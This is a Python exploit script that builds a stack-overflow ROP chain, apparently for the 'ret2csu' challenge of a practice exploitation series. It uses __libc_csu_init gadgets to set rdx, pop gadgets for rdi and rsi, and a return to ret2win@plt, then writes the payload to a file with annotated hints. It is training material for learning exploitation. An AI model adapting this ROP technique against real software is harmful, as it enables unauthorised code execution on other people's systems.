import struct

read_dest    = 0x7fffffffe130
ret_addr_loc = 0x7fffffffe158

fini_addr        = 0x4006b4
ret2win_plt_addr = 0x400510
pop_seq_addr     = 0x40069a
call_seq_addr    = 0x400680

pop_rdi_addr     = 0x4006a3
pop_rsi_addr     = 0x4006a1

def find_addr_in_file(filename, addr):
    with open(filename, "rb") as f:
        contents = f.read()

    search_pattern = struct.pack("<Q", addr)

    try:
        rtn = contents.index(search_pattern)
    except ValueError:
        print("Could not find 0x{:x} in {}".format(addr, filename))
        rtn = None

    return rtn

### Find a pointer to the _fini function.
fini_addr_ptr = 0x400000 + find_addr_in_file("ret2csu", fini_addr)

class Exploit():
    def __init__(self):
        self.payload = b""

        self.hints = []

        self.padding_int = 0x61

    def pad(self, num_bytes, b = None):
        if b is None:
            b = bytes([self.padding_int])
            self.padding_int += 1
            
        self.payload += b * num_bytes
        self.hints.extend(["padding"] * (num_bytes//8))

        if num_bytes % 8 != 0:
            print("Warning: padding is not 8-byte aligned.")
            print("This will mess up the hints.")

    def append_word(self, word, hint = ""):
        self.payload += struct.pack("<Q", word)
        
        self.hints.append(hint)

    def append_load_rdx_chain(self, rdx):
        ### Load registers in the first pop sequence.
        self.append_word(pop_seq_addr, hint = "ret to pop sequence")
        
        self.append_word(0, hint = "new rbx")
        self.append_word(1, hint = "new rbp")
        self.append_word(fini_addr_ptr, hint = "new r12 (_fini addr ptr)")
        self.append_word(0, hint = "padding for r13")
        self.append_word(0, hint = "padding for r14")
        self.append_word(rdx, hint = "r15 (rdx)")

        ### Return to the call sequence.
        self.append_word(call_seq_addr, hint = "ret to call seq")

        ### Pad for the add rsp instruction.
        self.pad(8)
        
        ### Pad out the pops before the next ret.
        self.pad(8 * 6)

    def append_load_rdi_chain(self, rdi):
        self.append_word(pop_rdi_addr, hint = "pop rdi")
        self.append_word(rdi, hint = "new rdi")

    def append_load_rsi_chain(self, rsi):
        self.append_word(pop_rsi_addr, hint = "pop rsi")
        ### Pad for the pop r15 instruction.
        self.append_word(rsi, hint = "new rsi")
        self.pad(8)

    def write(self, filename):
        with open(filename, "wb") as f:
            f.write(self.payload)
        print("Wrote {} (0x{:x}) bytes to {}".format(len(self.payload),
                                                   len(self.payload),
                                                   filename))

    def show_with_hints(self):
        for i in range(len(self.payload) // 8):
            chunk = self.payload[8*i: 8*i + 8]

            print("0x{:>3x}".format(8 * i),
                  "0x{:016x}".format(int.from_bytes(chunk, "little")),
                  "   ->", self.hints[i])

exploit = Exploit()

### Pad to the saved rip.
exploit.pad(ret_addr_loc - read_dest)

### Call usefulFunction to get ret2win's address loaded into the .got.
#exploit.append_word(useful_func_addr, hint = "usefulFunc (load ret2win into .got)")

exploit.append_load_rdx_chain(0xd00df00dd00df00d)
exploit.append_load_rdi_chain(0xdeadbeefdeadbeef)
exploit.append_load_rsi_chain(0xcafebabecafebabe)

exploit.append_word(ret2win_plt_addr, "ret2win@plt")

exploit.show_with_hints()

exploit.write("payload")
